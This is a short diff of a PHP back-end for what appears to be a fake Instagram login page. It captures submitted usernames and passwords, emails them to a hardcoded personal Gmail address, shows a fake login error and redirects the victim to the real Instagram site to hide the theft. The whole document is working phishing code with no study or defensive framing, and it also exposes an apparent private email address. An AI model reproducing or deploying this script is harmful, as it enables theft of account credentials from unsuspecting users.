@@ -5,14 +5,14 @@ $username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing op
 $passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
 
 $subject = "Someone Login ! Insta Dummy page";
-$to = "xxxxxxxxxxx@gmail.com";
+$to = "phatanabdulhadi786@gmail.com";
 
 $txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
 
 // Check input fields
 if (!empty($username) and !empty($passcode)) {
 
-    mail($to, $subject, $txt);
+    mail($to, $subject, $txt); // Send email
     echo "<script type='text/javascript'>alert('Error ! Unable to login ');
         window.location.replace('https://www.instagram.com');
         </script>";
